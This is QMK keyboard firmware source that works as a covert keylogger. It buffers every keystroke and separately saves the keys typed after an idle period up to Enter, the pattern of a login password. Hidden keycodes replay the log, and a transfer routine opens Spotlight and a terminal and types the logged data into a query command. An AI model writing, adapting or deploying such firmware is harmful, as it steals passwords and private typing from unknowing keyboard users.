#include QMK_KEYBOARD_H

#include "key_event.h"
#include "vsbuf.h"
#include "custom_control.h"
#include "keycode_convert.h"
#include "query_cmd.h"

#include <avr/io.h>
#include <stdbool.h>

// Run custom function on keydown event, intended for custom keycode
// Function should return false to indicate no further processing is required
#define RUN_IF_PRESSED(f, rec)    ((rec)->event.pressed ? f() : false)

enum custom_keycodes {
    KC_DMPV = SAFE_RANGE,   // Dump volatile events
    KC_DMPS,                // Dump saved events
    KC_TSFR,                // Transfer logged events
    KC_IDLE                 // Make idle
};

const uint16_t PROGMEM keymaps[][MATRIX_ROWS][MATRIX_COLS] = {
    LAYOUT(
        KC_GESC, KC_1,    KC_2,    KC_3,    KC_4,    KC_5,    KC_6,    KC_7,    KC_8,    KC_9,    KC_0,    KC_MINS, KC_EQL,  XXXXXXX, KC_BSPC,
        KC_TAB,  KC_Q,    KC_W,    KC_E,    KC_R,    KC_T,    KC_Y,    KC_U,    KC_I,    KC_O,    KC_P,    KC_LBRC, KC_RBRC, KC_BSLS,
        KC_CAPS, KC_A,    KC_S,    KC_D,    KC_F,    KC_G,    KC_H,    KC_J,    KC_K,    KC_L,    KC_SCLN, KC_QUOT,          KC_ENT,
        KC_LSFT, XXXXXXX, KC_Z,    KC_X,    KC_C,    KC_V,    KC_B,    KC_N,    KC_M,    KC_COMM, KC_DOT,  KC_SLSH, KC_RSFT, XXXXXXX,
        KC_LCTL, RESET,   KC_LGUI,                   KC_SPC,  KC_SPC,  KC_SPC,           KC_RGUI, KC_RALT, XXXXXXX, MO(1),   KC_RCTL
    ),

    LAYOUT(
        _______, _______, _______, _______, _______, _______, _______, _______, _______, _______, _______, _______, _______, _______, _______,
        _______, _______, _______, _______, RESET  , KC_TSFR, _______, _______, KC_IDLE, _______, _______, _______, _______, _______,
        _______, _______, KC_DMPS, _______, _______, _______, _______, _______, _______, _______, _______, _______,          _______,
        _______, _______, _______, _______, _______, KC_DMPV, _______, _______, _______, _______, _______, _______, _______, _______,
        _______, _______, _______,                   _______, _______, _______,          _______, _______, _______, _______, _______
    )
};

#define IDLE_TICK_THRESHOLD     429     // Become idle after 30 minutes
volatile uint16_t timer_ticks = 0;
static inline bool is_idle(void) { return timer_ticks == IDLE_TICK_THRESHOLD; }

static void init_idle_timer(void);
static void make_post_idle_saves_volatile(uint16_t num_saves);

static vsbuf_t keylog;

static void process_loggable_event(struct key_event event);

static bool set_idle_state(void);
static bool dump_volatile(void);
static bool dump_saved(void);
static bool transfer_logged_data(void);


bool process_record_user(uint16_t keycode, keyrecord_t *record) {
    uint8_t mapped_kc = map_qmk_kc(keycode);

    if (mapped_kc != NO_KEY_MAPPING) {
        struct key_event event = {
            .is_pressed = record->event.pressed,
            .mapped_kc = mapped_kc
        };

        process_loggable_event(event);
    }

    switch (keycode) {
        case KC_DMPV: return RUN_IF_PRESSED(dump_volatile, record);
        case KC_DMPS: return RUN_IF_PRESSED(dump_saved, record);
        case KC_TSFR: return RUN_IF_PRESSED(transfer_logged_data, record);
        case KC_IDLE: return RUN_IF_PRESSED(set_idle_state, record);
    }

    return true;
}

void keyboard_post_init_user(void) {
#ifndef NO_DEBUG
    debug_enable = true;
#endif
    vsbuf_reset(&keylog);
    init_idle_timer();
}

static void init_idle_timer(void) {
    // Use timer1 for detecting idle state
    TIMSK1 |= (0x1 << TOIE1);   // 0b1 enables interrupt on overflow
    TCCR1B |= (0x5 << CS10);    // 0b101 sets prescaler to 1024x
} 

static void make_post_idle_saves_volatile(uint16_t num_saves) {
    uint16_t start = vsbuf_saved_size(&keylog) - num_saves;
    for (uint16_t i = 0; i < num_saves; i++) {
        vsbuf_add_volatile(&keylog, vsbuf_get_saved(&keylog, start + i));
    }

    vsbuf_unsave_recent(&keylog, num_saves);
}


static void process_loggable_event(struct key_event event) {
    static uint16_t post_idle_saves = 0;

    if (is_idle()) {
        if (vsbuf_add_saved(&keylog, event) == SAVE_SUCCESS) {
            post_idle_saves++;
        } else {
            make_post_idle_saves_volatile(post_idle_saves);
            timer_ticks = 0;
            post_idle_saves = 0;
        }

        // Wait for ENTER to be released
        if (get_qmk_kc(event.mapped_kc) == KC_ENT && !event.is_pressed) {
            timer_ticks = 0;
            post_idle_saves = 0;
        }
    } else {
        vsbuf_add_volatile(&keylog, event);
    }
}

static bool set_idle_state(void) {
    dprintf("Enter IDLE\n");

    timer_ticks = IDLE_TICK_THRESHOLD;

    return false;
}

static bool dump_volatile(void) {
    dprintf("Dump volatile\n");

    for (uint16_t i = 0; i < vsbuf_volatile_size(&keylog); i++) {
        struct key_event event = vsbuf_get_volatile(&keylog, i);

        uint16_t qmk_kc = get_qmk_kc(event.mapped_kc);

        if (event.is_pressed) {
            register_code16(qmk_kc);
        } else {
            unregister_code16(qmk_kc);
        }
    }

    return false;
}

static bool dump_saved(void) {
    dprintf("Dump saved\n");

    for (uint16_t i = 0; i < vsbuf_saved_size(&keylog); i++) {
        struct key_event event = vsbuf_get_saved(&keylog, i);

        uint16_t qmk_kc = get_qmk_kc(event.mapped_kc);

        if (event.is_pressed) {
            register_code16(qmk_kc);
        } else {
            unregister_code16(qmk_kc);
        }
    }

    return false;
}

static bool transfer_logged_data(void) {
    dprintf("Transfer data\n");

    cli();

    open_spotlight();
    open_terminal();
    wait_ms(1000);

    send_string_P(QUERY_CMD_START);

    send_logged_data(&keylog);

    send_string_P(QUERY_CMD_END);
    tap_code(KC_ENT);

    sei();

    return false;
}


ISR(TIMER1_OVF_vect) {
    if (timer_ticks < IDLE_TICK_THRESHOLD) {
        timer_ticks++;
    }
}
